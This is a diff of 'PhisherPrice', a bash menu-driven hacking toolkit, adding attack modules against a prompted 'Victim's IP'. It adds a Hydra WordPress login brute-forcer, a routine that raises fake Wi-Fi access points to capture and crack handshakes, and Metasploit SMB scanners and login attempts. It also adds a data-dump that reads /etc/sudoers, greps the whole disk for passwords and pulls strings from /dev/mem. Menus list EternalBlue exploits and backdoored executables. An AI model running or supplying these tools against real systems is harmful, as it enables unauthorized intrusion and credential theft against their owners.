@@ -17,7 +17,7 @@ yellow='\e[0;33m'
 Blue='\e[1;34m'
 
 ip=$(ip addr show wlan0 | awk '/inet / {print $2}' | cut -d/ -f 1)
-
+service postgresql start
 echo -e '\e[1;33m
 ///,        ////
 \  /,      /  >.
@@ -45,7 +45,6 @@ echo -e '\e[1;33m
 (c) Contact Information
 CTRL + C To Exit
 '
-service postgresql start
 option1='1'
 option2='2'
 option3='3'
@@ -74,7 +73,7 @@ echo -e '\e[1;33m
        // //```
 ======((`((====\e[1;34m
 '
- echo -e '\e[3;34m Created by "Sir Cryptic"                 
+echo -e '\e[3;34m Created by "Sir Cryptic"                 
                    https://nullsec.online
 \e[0m\e[3;39m \e[1;31m
 Recon & Auditing
@@ -98,7 +97,7 @@ Recon & Auditing
 (s17) Get Server Users
 (s18) SQL Map
 (s19) SQL Map (Quick/Deep)
-
+(s20) Scan For Vulns (Metasploit)
 CTRL + C To Exit
 Press ENTER To Go To Main Menu
 '
@@ -121,6 +120,7 @@ sub16='s16'
 sub17='s17'
 sub18='s18'
 sub19='s19'
+sub20=s'20'
 
 echo -e $Blue" ┌─["$red"PhisherPrice$Blue]──[$red~$Blue]─["$yellow"Recon & Audit$Blue]:"
 echo -e $Blue" └─────► " ;read -p " CHOOSE: " x
@@ -524,7 +524,7 @@ echo -e '
 !!  Looking Up Info About The Number  !!
 !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
 '
-curl https://api.telnyx.com/v1/phone_number/$subop15
+curl https://api.telnyx.com/anonymous/v2/number_lookup/$subop15
 
 echo -e '
 !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
@@ -555,7 +555,7 @@ echo -e '
 !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
 '
 
-curl https://api.telnyx.com/anonymous/v2/number_lookup/$subop16
+curl https://api.hackertarget.com/analyticslookup/?q=$subop16
 
 echo -e '
 !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
@@ -652,6 +652,22 @@ sqlmap -u $sqlhost2  searchgetby_id.$phphtml1?id=4 --dbs --columns -D scanme --t
 
 read
 
+elif [ "$x" == "$sub20" ]; then                    #sub-Option-20
+clear
+echo -e '\e[1;33m
+MSPLOIT VULN SCANNER \e[1;34m
+'
+echo "Victim's IP:"
+read r
+
+msfconsole -q -x "nmap -v --script vuln $r ;exit ;"
+echo ' '
+echo '           Press ENTER to Main Menu '
+echo ' '
+read
+
+read
+
 else 
 
 n
@@ -684,7 +700,8 @@ Cracking / Brute Force
 (c4) Hashcat
 (c5) Aircrack-ng (Crack Wifi Pass)
 (c6) Start sqldict
-
+(c7) Wifi Honey Pot Cracker
+(c8) Just Dump It
 CTRL + C To Exit
 Press ENTER To Go To Main Menu
 '
@@ -694,6 +711,8 @@ subh='c3'
 subi='c4'
 subj='c5'
 subk='c6'
+honeywhy='c7'
+dumpitall='c8'
 
 
 wait
@@ -728,8 +747,7 @@ Hydra Brute Force
 (h7) HTTP 401 Brute Force
 (h8) Windows RDP Brute Force
 (h9) SMB Brute Force
-
-
+(h10) WP AUTO BRUTE
 CTRL + C To Exit
 Press ENTER To Go To Main Menu
 '
@@ -742,7 +760,7 @@ hynull6='h6'
 hynull7='h7'
 hynull8='h8'
 newoption1='h9'
-
+HYDRAWPAUTOBRUTE='h10'
 
 echo -e $Blue" ┌─["$red"PhisherPrice$BlueF]──[$red~$Blue]─["$yellow"Hydra$Blue]:"
 echo -e $Blue" └─────► " ;read -p " CHOOSE: " x
@@ -852,6 +870,36 @@ echo "Enter The IP Address"
 read hydraip3
 
 hydra $hydraip3 -s 22 ssh -l $hydrauser3 -P $hydrapasslist3
+
+read
+
+elif [ "$x" == "$HYDRAWPAUTOBRUTE" ]; then                    #hynull-Option-9
+clear
+echo "Hydra WP Auto Brute"
+echo "Url (ex:target.com) : http://" 
+read url
+echo "Path (ex:/wp-login.php) : " 
+read path
+echo "User (ex:admin or /path/wordlist.txt) : " 
+read user
+echo "Pass (ex:12345 or /path/wordlist.txt) : " 
+read pass
+echo "Bad Login (ex:wrong) : " 
+read bad
+echo "Parameter (ex:username=^USER^&password=^PASS^) : " 
+read parameter
+sleep 1
+echo "[+] Execute : http://$url/$path"
+sleep 0.5
+echo "[+] User : $user"
+sleep 0.5
+echo "[+] Pass : $pass"
+sleep 0.5
+echo "[+] Bad Login : $bad"
+sleep 0.5
+echo "[+] Parameter : $parameter"
+sleep 0.5
+hydra -I $url http-post-form $path:$parameter:$bad -l $user -P $pass
 
 read
 
@@ -1057,6 +1105,303 @@ sqldict
 
 read
 
+elif [ "$x" == "$honeywhy" ]; then                    #hynull-Option-9
+clear
+echo -n "Wireless interface wlan1 or wlan0 ??"
+read iface
+echo "-> we will start the monitor mode in mon0 "
+ifconfig $iface down
+macchanger -r $iface
+ifconfig $iface up
+airmon-ng start $iface
+echo "we will start the airodumpn-ng please note the probe name "
+xterm -bg black -fg green -e airodump-ng mon0 &
+pid1=$!
+echo "note the name below the probe once you have got it close "
+echo "the small window"
+echo "also note the channel please "
+echo -n "whats the essid i.e probe name"
+read essid
+echo -n " channel ??"
+read ch
+kill $pid1
+echo "CREATING FOUR FAKE AP with the name of $essid "
+airmon-ng start $iface #open mon1
+airmon-ng start $iface #wep mon2
+airmon-ng start $iface #wpa mon3
+airmon-ng start $iface #wpa2 psk mon4
+sleep 2
+xterm -e airbase-ng --essid $essid -a aa:aa:aa:aa:aa:aa -c $ch mon1 &
+pid2=$!
+sleep 2
+xterm -e airbase-ng --essid $essid -a bb:bb:bb:bb:bb:bb -c $ch mon2 -W 1 &
+pid3=$!
+sleep 2
+xterm -e airbase-ng --essid $essid -a cc:cc:cc:cc:cc:cc -c $ch mon3 -W 1 -z 2 &
+pid4=$!
+sleep 2
+xterm -e airbase-ng --essid $essid -a dd:dd:dd:dd:dd:dd -c $ch mon4 -W 1 -Z 4 &
+pid5=$!
+sleep 2
+echo "all ap up and running ..."
+echo "Dumping The Handshake If Any...."
+echo -n "give the file a name"
+read fname
+echo "If there is any handshake close the dialog box ... "
+xterm -e airodump-ng --channel $ch --write $fname mon0
+sleep 2
+kill $pid2
+kill $pid3
+kill $pid4
+kill $pid5
+echo "Launching the attack fingers crossed we did it .. HOPEFULLY"
+aircrack-ng -w /usr/share/rockyou.txt $fname-01.cap
+sleep 3
+echo -n "So we done lets quit."
+read s
+airmon-ng stop mon4
+airmon-ng stop mon3
+airmon-ng stop mon2
+airmon-ng stop mon1
+airmon-ng stop mon1
+echo "shutting down..."
+
+read
+
+elif [ "$x" == "$dumpitall" ]; then                    #hynull-Option-9
+# A modified version of Gary Hooks' work sys_info.sh:
+# 	Original Author: Gary Hooks
+# 	Web: http://www.twintel.co.uk
+# Supporting input from:
+#	MYero
+#	JGuz
+#	SANDFLY SECURITY Linux Compromise Assessment Cmd Cheat Sheet
+# Publish Date: 13th May 2020
+# Version: 1.2
+# Licence: GNU GPL 
+
+current_time=$(date "+%Y.%m.%d-%H.%M.%S")
+folderName="${current_time}_Linux_Data_Dump"
+mkdir "$folderName"
+OutputFileName="${current_time}_Linux_Data_Dump.rtf"
+DEL_RUNNING="\b\b\b\b\b\b\b\b"
+CLEAR_EOL=$(tput el)
+
+# First Param: System Name
+# Second Param: String describing the overall contents of the file
+# Example Useage: insertHeader "MaxEdge" "Passwords in clear text" 
+function insertHeader()
+{
+	printf "########################################################################\n" | tee -a $CURRENT_FILE
+	printf "###                  Linux Data Dump                                 ###\n" | tee -a $CURRENT_FILE
+	printf "###                       $1                             ###\n" | tee -a $CURRENT_FILE
+	printf "###                       $2                                   ###\n" | tee -a $CURRENT_FILE
+	printf "########################################################################\n\n" | tee -a $CURRENT_FILE
+}
+
+# First Param: Subsection title
+# Example usage: insertPartition "ARP Tables"
+function insertPartition()
+{
+    printf -- "\n----------------------------$1----------------------------------------\n" | tee -a $CURRENT_FILE
+}
+
+# First Param: String with Descriptive Title
+# Second Param: String with actual command
+# Example Usage: runTest "List of Files in Current Folder" "ls -lah"
+
+function runTest()
+{
+    NAME_OF_TEST=$1
+    COMMAND_TO_RUN=$2
+    printf "$1 - Running"
+    insertPartition $1
+    printf "($2)\n" >> $CURRENT_FILE
+    eval $2 >> $CURRENT_FILE
+    printf "\n\n" >> $CURRENT_FILE
+    printf "$DEL_RUNNING Saved$CLEAR_EOL\n"
+}
+
+echo "Project Name: "
+read projectName
+
+##++++++++++++++++ System Data.rtf+++++++++++++++++++++++
+CURRENT_FILE=$folderName/system_data.rtf
+touch $CURRENT_FILE
+insertHeader $projectName "General_Information"
+runTest "Host_Name" "hostname"
+runTest "Host_IP" "hostname -I"
+runTest "Domain_Name" "domainname"
+runTest "Connectivity_Check" "ping -c 4 8.8.8.8"
+runTest "Who_Am_I" "whoami"
+runTest "Uptime" "uptime"
+runTest "System_Name_&_Version" "uname -a"
+COMMAND_STRING='lsb_release -a 2>/dev/null | grep -E "Distributor|Description|Release"'
+insertPartition "Distributer,_Description,_Release"
+printf "($COMMAND_STRING)\n" >> $CURRENT_FILE
+eval $COMMAND_STRING >> $CURRENT_FILE
+printf "\n\n" >> $CURRENT_FILE
+runTest "Logged_In_Users" "who -a"
+#Last Logins list length; Full List: last -a; 
+runTest "Last_10_Logins" "last -a | head -10"
+runTest "Currently_Connected" "w"
+runTest "List_User_Accounts" "cat /etc/passwd"
+runTest "List_Sudoers_File" "cat /etc/sudoers"
+runTest "Available_Shells" "cat /etc/shells | tail -n +2"
+runTest "Environment_Variables" "env"
+
+
+##++++++++++++++++ Memory Data.rtf+++++++++++++++++++++++
+CURRENT_FILE=$folderName/memory_data.rtf
+touch $CURRENT_FILE
+insertHeader $projectName "Storage_&_Memory_Data"
+runTest "Block_&_Storage_Devices" "lsblk -a"
+runTest "Find_Mounted_Filesystems" "findmnt -A"
+runTest "File_System_&_Partitions" "df -h"
+runTest "Ram_Info" "free -m"
+runTest "Memory_Info" "cat /proc/meminfo"
+runTest "Find_Hiden_Directories" 'find / -type d -name".*"'
+
+##++++++++++++++++ Network Data.rtf+++++++++++++++++++++++
+CURRENT_FILE=$folderName/network_data.rtf
+touch $CURRENT_FILE
+insertHeader $projectName "Network_Info"
+runTest "Host_Name" "hostname"
+runTest "Domain_Name" "domainname"
+runTest "Connectivity_Check" "ping -c 4 8.8.8.8"
+runTest "Interface_Information(IFCONFIG)" "ifconfig -a"
+runTest "Interface_Information(IP)" "ip address"
+runTest "Routing_Table" "route -n"
+runTest "IP_Tables" "iptables -t nat -vnL"
+runTest "ARP_Table" "arp -a"
+runTest "Net_Stat_(all)" "netstat -a"
+runTest "Net_Stat_(Listening)" "netstat -lapn"
+runTest "Listening_Ports" "ss -lntu"
+runTest "Current_Connections" "ss -s"
+runTest "Resolve_Conf" "cat /etc/resolv.conf"
+###runTest "Firewall_Rules" "firewall-cmd --list-all"
+runTest "UFW_Firewall_Rules_Verbose" "ufw status verbose"
+runTest "UFW_Firewall_Rules_Numbered" "ufw status numbered"
+
+##++++++++++++++++ Hardware Data.rtf+++++++++++++++++++++++
+CURRENT_FILE=$folderName/hardware_data.rtf
+touch $CURRENT_FILE
+insertHeader $projectName "Hardware_Info"
+runTest "CPU_Info" "lscpu"
+insertPartition "Device_List"
+row_count=$(lspci | wc -l)
+for (( c=1; c<=${row_count}; c++ ))
+do
+	lspci| sed  "${c}q;d" | cut -c 9- | tee -a $CURRENT_FILE
+done
+runTest "PCI_Devices" "lspci"
+runTest "PCI_Devices_(Detailed)" "lspci -v"
+runTest "USB_Devices" "lsusb"
+runTest "USB_Devices_(Detailed)" "lsusb -v"
+###runTest "Dmesg_Info" "dmesg"
+
+
+##++++++++++++++++ Software Data.rtf+++++++++++++++++++++++
+CURRENT_FILE=$folderName/software_data.rtf
+touch $CURRENT_FILE
+insertHeader $projectName "Software_Info"
+insertPartition "Common_Packages"
+#checks if packages in the list are installed and tells thier version
+packages=("python" "python3" "mysql" "ruby" "perl" "bash" "ssh" "telnet")
+#packages can be added above to search more packages
+for i in "${packages[@]}"
+do
+    version=$(apt-cache show $i 2>/dev/null | grep -m 1 Version | wc -l )
+    DETAIL="NOT INSTALLED"
+	if [ $version == 1 ]
+	then    #if the package is installed, show the version
+		DETAIL=$(apt-cache show $i 2>/dev/null | grep -m 1 Version | awk '{ printf "VERSION:" $2 "\n" }' )
+	fi
+	printf "PACKAGE:${i}\t $DETAIL \n" | tee -a $CURRENT_FILE
+done
+runTest "Loadable_Kernel_Modules" "lsmod"
+runTest "Startup_Programs" "ls -lah /etc/init.d/"
+runTest "Installed_Programs" "apt list --installed"
+runTest "Services_Programs" "service --status-all"
+runTest "Systemctl_Programs" "systemctl status --all"
+
+##++++++++++++++++ Process Data.rtf+++++++++++++++++++++++
+CURRENT_FILE=$folderName/process_data.rtf
+touch $CURRENT_FILE
+insertHeader $projectName "Process Info"
+runTest "Top_5_CPU_Processes" "ps auxwwwf | sort -nr -k 3 | head -5"
+runTest "Top_5_Mem_Processes" "ps auxwwwf | sort -nr -k 4 | head -5"
+runTest "Current_Processes" "ps auxwwwf"
+runTest "Directory_of_Running_Processes" "ls -l /proc/*/cwd"
+runTest "Executable_of_Running_Processes" "ls -l /proc/*/exe"
+runTest "Arguements_of_Running_Processes" "grep -a ^ /proc/*/cmdline"
+runTest "Deleted_Binaries_Still_Running" "ls -aIR /proc/*/exe 2>/dev/null | grep deleted"
+# Running from tmp and dev need more testing/verification of functionality
+runTest "Proccesses Running From tmp" "ls -aIR /proc/*/cwd 2>/dev/null | grep tmp"
+runTest "Proccesses Running From dev" "ls -aIR /proc/*/cwd 2>/dev/null | grep dev"
+runTest "Cmd_History_Files" "find / -name *.history"
+runTest "Cmd_History" "history"
+
+##++++++++++++++++ Password Data.rtf+++++++++++++++++++++++
+CURRENT_FILE=$folderName/password_data.rtf
+touch $CURRENT_FILE
+insertHeader $projectName "Passwords"
+
+#This search for clear text passwords TAKES A LONG TIME
+COMMAND_STRING='grep -rnw "/" -ie "PASSWORD" 2> /dev/null'
+insertPartition "Clear_Text_Passwords"
+printf "($COMMAND_STRING)\n" >> $CURRENT_FILE
+eval $COMMAND_STRING >> $CURRENT_FILE
+printf "\n\n" >> $CURRENT_FILE
+
+runTest "More_Clear_Text_Passwords" 'find . -type f -exec grep -i -I "PASSWORD" {} /dev/null \;'
+runTest "Passwords_In_Memory" 'strings /dev/mem -n10 | grep -i PASS'
+
+##++++++++++++++++ Misc Data.rtf+++++++++++++++++++++++
+CURRENT_FILE=$folderName/misc_data.rtf
+touch $CURRENT_FILE
+insertHeader $projectName "Misc_Data"
+runTest "SUID_Binaries" "find / -perm -4000 -type f -exec ls -la {} 2>/dev/null"
+runTest "SGID_Binaries" "find / -perm -2000 -type f -exec ls -la {} 2>/dev/null"
+runTest "Binaries_Of_Interest" "find / -uid 0 -perm -4000 -type f 2>/dev/null"
+runTest "World_Writable_Files" "find / -writable ! -user `whoami` -type f ! -path "/proc/*" ! -path "/sys/*" -exec ls -al {} \; 2>/dev/null"
+runTest "World_Writable_Files" "find / -perm -2 -type f 2>/dev/null"
+runTest "World_Writable_Files" "find / ! -path "*/proc/*" -perm -2 -type f -print 2>/dev/null"
+runTest "Crontab_Jobs" "crontab -l"
+
+## Collect Logs: find /var/log -mtime -$logDate -exec cp {} $tmp/logs/ \; nested folders are huge!!
+
+
+##++++++++++++++++ Docker Data.rtf+++++++++++++++++++++++
+## CURRENT_FILE=$folderName/docker_data.rtf
+## touch $CURRENT_FILE
+## insertHeader $projectName "Docker_Container_Enumeration"
+        
+## runTest "" ""     https://docs.docker.com/engine/reference/commandline/container_ls/
+
+
+##++++++++++++++++ Zip Data and Remove Files +++++++++++++++++++++++
+CURRENT_FILE=$folderName/system_data.rtf
+DATE=$(date +"%d %B %Y")
+TIME=$(date +"%T")
+CURRENT_PATH=$(pwd)
+printf "\n\n" | tee -a $CURRENT_FILE
+printf "Process Completed\n" | tee -a $CURRENT_FILE
+printf -- "------------------------------------\n" | tee -a $CURRENT_FILE
+printf "End Time: \t $TIME\n" | tee -a $CURRENT_FILE
+printf "End Date: \t $DATE\n" | tee -a $CURRENT_FILE
+printf "\n\n" | tee -a $CURRENT_FILE
+
+## END ##
+FINAL_PATH="$CURRENT_PATH/$folderName.tgz"
+printf "Compressing Results into Package\n\n"
+tar -czvf $FINAL_PATH $folderName/*
+printf "\nCleaning up\n\n"
+rm -rf $folderName
+printf "Results will be stored here: \t $FINAL_PATH \n\n"
+
+
+
 else 
 
 n
@@ -1083,7 +1428,7 @@ echo -e '\e[1;33m
 \e[0m\e[3;39m \e[1;31m
 Auto Xsploit
 \e[3;39m
-(a1) Test Target If They are Vulnerable To (ms17_010)
+(a1) Scanners
 (a2) Windows 7/2008 x64 ONLY by IP         (ms17_010_eternalblue)
 (a3) Enable Remote Desktop                 (ms17_010_eternalblue)
 (a4) Enable Remote Desktop                 (ms17_010_psexec)
@@ -1101,8 +1446,6 @@ Auto Xsploit
 (a16) Backdoor .exe
 (a17) Bind .exe With Payload & Encode (using shikata_ga_nai)
 (a18) Android    --> pwnd.apk (payload & listener) 
-
-
 CTRL + C To Exit
 Press ENTER To Go To Main Menu
 '
@@ -1131,6 +1474,48 @@ echo -e $Blue" └─────► " ;read -p " CHOOSE: " x
 
 if [ "$x" == "$auto1" ]; then                    #auto-Option-1
 clear
+echo -e '\e[1;33m
+///,        ////
+\  /,      /  >.
+ \  /,   _/  /.
+  \_  /_/   /.
+   \__/_   <    PhisherPrice
+   /<<< \_\_  Happy Hour Playset
+  /,)^>>_._ \ Version 2.5 
+  (/   \\ /\\\
+       // //```
+======((`((====\e[1;34m
+'
+ echo -e '\e[3;34m Created by "Sir Cryptic"                 
+                   https://nullsec.online
+\e[0m\e[3;39m \e[1;31m
+Auto Scanners
+\e[3;39m
+(q1) Test Target If They are Vulnerable To (ms17_010)
+(q2) Determine Named Pipes Over SMB (pipe_auditor)
+(q3) Discover DCERPC Services (pipe_dcerpc_auditor)
+(q4) Scans Host & determines If They Support SMB2
+(q5) Enumerate The Users On The System (smb_enumusers)
+(q6) Attempt To Login Via SMB (smb_login)
+(q7) Brute-forces SID Lookups to determine what local users exist the system (SMB_LOOKUPSID)
+(q8) determine The Version Of The SMB Service That Is Running (smb_version)
+CTRL + C To Exit
+Press ENTER To Go To Main Menu
+'
+scub1='q1'
+scub2='q2'
+scub3='q3'
+scub4='q4'
+scub5='q5'
+scub6='q6'
+scub7='q7'
+scub8='q8'
+
+echo -e $Blue" ┌─["$red"PhisherPrice$Blue]──[$red~$Blue]─["$yellow"Scanners$Blue]:"
+echo -e $Blue" └─────► " ;read -p " CHOOSE: " x
+
+if [ "$x" == "$scub1" ]; then                    #scub-Option-1
+clear
 echo "Victim's IP:"
 read r
 
@@ -1139,6 +1524,93 @@ echo ' '
 echo '           Press ENTER to Main Menu '
 echo ' '
 read
+
+elif [ "$x" == "$scub2" ]; then                    #scub-Option-2
+clear
+echo "Victim's IP:"
+read r
+
+msfconsole -q -x " use auxiliary/scanner/smb/pipe_auditor; set rhosts $r ; exploit ;exit ;"
+echo ' '
+echo '           Press ENTER to Main Menu '
+echo ' '
+read
+
+elif [ "$x" == "$scub3" ]; then                    #scub-Option-3
+clear
+echo "Victim's IP:"
+read r
+
+msfconsole -q -x " use auxiliary/scanner/smb/pipe_dcerpc_auditor; set rhosts $r ; exploit ;exit ;"
+echo ' '
+echo '           Press ENTER to Main Menu '
+echo ' '
+read
+
+elif [ "$x" == "$scub4" ]; then                    #scub-Option-4
+clear
+echo "Victim's IP:"
+read r
+
+msfconsole -q -x " use auxiliary/scanner/smb/smb2; set rhosts $r ; exploit ;exit ;"
+echo ' '
+echo '           Press ENTER to Main Menu '
+echo ' '
+read
+
+elif [ "$x" == "$scub5" ]; then                    #scub-Option-5
+clear
+echo "Victim's IP:"
+read r
+
+msfconsole -q -x " use auxiliary/scanner/smb/smb_enumusers; set rhosts $r ; exploit ;exit ;"
+echo ' '
+echo '           Press ENTER to Main Menu '
+echo ' '
+read
+elif [ "$x" == "$scub6" ]; then                    #scub-Option-6
+clear
+echo "Victim's IP:"
+read r
+echo "Victim's Password:"
+read passmb
+echo "Victim's User Account:"
+read accsmb
+
+msfconsole -q -x " use auxiliary/scanner/smb/smb_login; set rhosts $r ; set SMBPass $passmb ; set SMBUser $accsmb ; exploit ;exit ;"
+echo ' '
+echo '           Press ENTER to Main Menu '
+echo ' '
+read
+elif [ "$x" == "$scub7" ]; then                    #scub-Option-7
+clear
+echo "Victim's IP:"
+read r
+
+msfconsole -q -x " use auxiliary/scanner/smb/smb_lookupsid; set rhosts $r ; exploit ;exit ;"
+echo ' '
+echo '           Press ENTER to Main Menu '
+echo ' '
+read
+
+elif [ "$x" == "$scub8" ]; then                    #scub-Option-8
+clear
+echo "Victim's IP:"
+read r
+
+msfconsole -q -x " use auxiliary/scanner/smb/smb_version; set rhosts $r ; exploit ;exit ;"
+echo ' '
+echo '           Press ENTER to Main Menu '
+echo ' '
+read
+
+else 
+
+n
+
+
+fi
+
 
 
 elif [ "$x" == "$auto2" ]; then                    #auto-Option-2
@@ -1364,7 +1836,6 @@ WI-FI xSploits
 (w9) Start Eassid-ng (Buddy-ng)
 (w10) Start Kismet
 (w11) Wi-Fi HoneyPot
-
 CTRL + C To Exit
 Press ENTER To Go To Main Menu
 '
@@ -1455,7 +1926,6 @@ Cisco Wifi Routers
 \e[3;39m
 (r1) Cisco GE xPloit
 (r2) Cisco Audit Tool
-
 CTRL + C To Exit
 Press ENTER To Go To Main Menu
 '
@@ -1825,7 +2295,6 @@ Create Your Own Xsploit
 (x11) Powershell
 (x12) Python
 (x13) Tomcat
-
 CTRL + C To Exit
 Press ENTER To Go To Main Menu
 '
@@ -1968,7 +2437,6 @@ Created by "Sir Cryptic"
 https://nullsec.online
 \e[0m \e[1;31m
 This Was Created For Educational Purposes Only
-
 \e[3;39m
 (e1) Read Image MetaData (Basic)
 (e2) Read Image MetaData (Expert)
@@ -1980,7 +2448,6 @@ This Was Created For Educational Purposes Only
 (e8) Extract Info From Thumbnail
 (e9) Wipe Photoshop MetaData
 (i) Help
-
 CTRL + C To Exit
 '
 autoexiftool1='e1'
@@ -2003,7 +2470,6 @@ if [ "$x" == "$autoexiftool1" ]; then                    #readmetadata basic
 echo "enter image name followed by its file type eg: /home/username/Pictures/lulz.png"
 read meta1
 echo -e '
-
 !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
 !!!!        Extracting Data        !!!!!
 !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
@@ -2012,11 +2478,9 @@ echo -e '
 exiftool $meta1
 
 echo -e '
-
 !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
 !!!! Data Extracted using AutoExif !!!!!
 !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
-
 Press ENTER To Go Back To The Main Menu
 '
 
@@ -2027,7 +2491,6 @@ elif [ "$x" == "$autoexiftool2" ]; then                          #readmetadatade
 echo "enter image name followed by its file type eg: /home/username/Pictures/lulz.png"
 read mdeep
 echo -e '
-
 !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
 !!!!        Extracting Data        !!!!!
 !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
@@ -2036,11 +2499,9 @@ echo -e '
 cat $mdeep | exiftool -
 
 echo -e '
-
 !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
 !!!! Data Extracted using AutoExif !!!!!
 !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
-
 Press ENTER To Go Back To The Main Menu
 '
 
@@ -2050,7 +2511,6 @@ elif [ "$x" == "$autoexiftool3" ]; then                          #webextract
 echo "enter image location for eg: http://a.domain.com/bigfile.jpg"
 read exifop1host
 echo -e '
-
 !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
 !!!!        Extracting Data        !!!!!
 !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
@@ -2059,11 +2519,9 @@ echo -e '
 curl -s $exifop1host | exiftool -fast -
 
 echo -e '
-
 !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
 !!!! Data Extracted using AutoExif !!!!!
 !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
-
 Press ENTER To Go Back To The Main Menu
 '
 
@@ -2073,7 +2531,6 @@ elif [ "$x" == "$autoexiftool4" ]; then                          #autoexiftool4
 echo "enter image name followed by its file type eg: /home/username/Pictures/lulz.png"
 read exifop4
 echo -e '
-
 !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
 !!!!       Wiping JFIF Data        !!!!!
 !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
@@ -2082,11 +2539,9 @@ echo -e '
 exiftool -all= --jfif:all $exifop4
 
 echo -e '
-
 !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
 !!!!   Data Wiped Using AutoExif   !!!!!
 !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
-
 Press ENTER To Go Back To The Main Menu
 '
 
@@ -2097,7 +2552,6 @@ elif [ "$x" == "$autoexiftool5" ]; then                          #AVCHextract
 echo "enter image name followed by its file type eg: /home/username/Pictures/lulz.png"
 read exifop5
 echo -e '
-
 !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
 !!!!        Wiping GPS Data        !!!!!
 !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
@@ -2106,11 +2560,9 @@ echo -e '
 exiftool -gps:all= $exifop5
 
 echo -e '
-
 !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
 !!!!   Data Wiped Using AutoExif   !!!!!
 !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
-
 Press ENTER To Go Back To The Main Menu
 '
 
@@ -2120,7 +2572,6 @@ elif [ "$x" == "$autoexiftool6" ]; then                          #autoexiftool6
 echo "enter image name followed by its file type eg: /home/username/Pictures/lulz.png"
 read exifop6
 echo -e '
-
 !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
 !!!!        Replacing Data         !!!!!
 !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
@@ -2129,11 +2580,9 @@ echo -e '
 exiftool -all= -comment='Protected By NULLSecurity Team' $exifop6
 
 echo -e '
-
 !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
 !!!!! Data Replaced Using AutoExif !!!!!
 !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
-
 Press ENTER To Go Back To The Main Menu
 '
 
@@ -2143,7 +2592,6 @@ elif [ "$x" == "$autoexiftool7" ]; then                          #autoexiftool7
 echo "enter image name followed by its file type eg: /home/username/Videos/lulz.m2ts"
 read avch
 echo -e '
-
 !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
 !        EXTRACTING PLEASE WAIT        !
 !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
@@ -2153,11 +2601,9 @@ echo -e '
 exiftool -ee -p '$gpslatitude, $gpslongitude, $gpstimestamp' $avch
 
 echo -e '
-
 !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
 !!!! Data Extracted using AutoExif !!!!!
 !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
-
 Press ENTER To Go Back To The Main Menu
 '
 
@@ -2169,7 +2615,6 @@ elif [ "$x" == "$autoexiftool8" ]; then                          #AVCHExtract
 echo "enter image name followed by its file type eg: /home/username/pictures/lulz.png"
 read exif8
 echo -e '
-
 !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
 !        EXTRACTING PLEASE WAIT        !
 !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
@@ -2179,11 +2624,9 @@ echo -e '
 exiftool $exif8 -thumbnailimage -b | exiftool -
 
 echo -e '
-
 !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
 !!!! Data Extracted using AutoExif !!!!!
 !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
-
 Press ENTER To Go Back To The Main Menu
 '
 
@@ -2195,11 +2638,9 @@ elif [ "$x" == "$autoexiftool9" ]; then                          #autoexiftool9
 echo -e '
 Delete Photoshop meta information from an image (note that the Photoshop informatio nalso includes IPTC).
 enter image name followed by its file type eg: /home/username/pictures/lulz.jpg
-
 '
 read psd
 echo -e '
-
 !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
 !        EXTRACTING PLEASE WAIT        !
 !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
@@ -2209,11 +2650,9 @@ echo -e '
 exiftool -Photoshop:All= $psd
 
 echo -e '
-
 !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
 !!!! Data Extracted using AutoExif !!!!!
 !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
-
 Press ENTER To Go Back To The Main Menu
 '
 
@@ -2226,8 +2665,6 @@ elif [ "$x" == "$help" ]; then                          #autoexiftool10
 clear
 echo -e '\e[1;33m
 \e[0m
-
-
  \e[1;31m
 You can Put This Script In The Desired Folder You Like Where The Media
 Is Located Then You can execute the script
@@ -2235,10 +2672,7 @@ when the script is in the media folder you want you can just type the
